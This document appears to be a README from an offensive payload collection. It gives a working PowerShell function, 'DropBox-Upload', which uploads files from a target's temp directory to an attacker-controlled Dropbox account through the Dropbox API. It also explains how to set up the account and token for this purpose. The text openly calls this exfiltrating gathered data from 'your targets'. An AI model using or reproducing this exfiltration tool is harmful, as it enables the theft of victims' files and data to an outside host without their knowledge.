## Description

This function is used to exfiltrate gathered data to DropBox 

## The Function

### [DropBox-Upload] 

First off for this function to work you need to have a DropBox account. Make one [HERE](https://www.dropbox.com).

Follow this [GUIDE](https://developers.dropbox.com/oauth-guide) for setting up your DropBox account for uploads

Use the following syntax for your upload:

```PowerShell
DropBox-Upload -FileName "file.txt"

or

"file.txt" | DropBox-Upload
```

Make sure to plug in your newly aquired DropBox token in the $DropBoxAccessToken variable below

(this function will exfiltrate a file from your targets temp directory so make sure you save your aquired data to the same directory)

```PowerShell
function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN-HERE"   # Replace with your DropBox Access Token
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}
```